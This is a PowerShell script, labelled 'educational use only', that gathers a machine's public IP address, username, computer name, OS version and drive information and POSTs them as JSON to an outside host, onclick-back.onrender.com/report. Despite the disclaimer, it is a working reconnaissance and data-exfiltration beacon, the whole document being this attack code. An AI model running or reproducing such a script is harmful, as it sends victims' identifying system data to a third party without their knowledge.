# ⚠️ EDUCATIONAL USE ONLY
# This script simulates basic identity data collection for training/test purposes

$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$version = (Get-CimInstance Win32_OperatingSystem).Version
$drives = Get-PSDrive -PSProvider 'FileSystem' | Select-Object Name, Free, Used

$data = @{
  ip = $ip
  username = $user
  computer = $computer
  os = $os
  version = $version
  drives = $drives
  timestamp = (Get-Date).ToString('s')
}

Invoke-RestMethod -Uri "https://onclick-back.onrender.com/report" -Method POST -Body ($data | ConvertTo-Json -Depth 3) -ContentType "application/json"
